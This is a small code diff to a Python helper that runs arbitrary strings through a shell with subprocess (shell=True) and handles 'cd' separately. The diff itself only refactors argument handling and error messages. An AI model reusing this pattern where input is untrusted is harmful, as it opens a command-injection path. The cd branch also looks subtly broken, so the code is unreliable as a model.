@@ -13,20 +13,19 @@ def decode_bytes(data):
 
 
 
-def execute_shell_command(cmd):
-        
+def execute_shell_command(args):
+        cmd =args[0]
         if cmd[:2] == "cd" and len(cmd) > 2:
             try:
                 # Use subprocess library to execute shell command
                 output = os.chdir(cmd[3:])
                 return decode_bytes(output)
             except Exception as e:
-                 return colored(f"Error running command '{cmd}': {str(e)}" , "red")
+                 return colored("Error running command "+cmd+": " +str(e) , "red")
         else:
             try:
                 # Use subprocess library to execute shell command
                 output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-                print(output)
                 return decode_bytes(output)
             except Exception as e:
-                return colored(f"Error running command '{cmd}': {str(e)}" , "red")
+                return colored("Error running command "+cmd+": " +str(e) , "red")
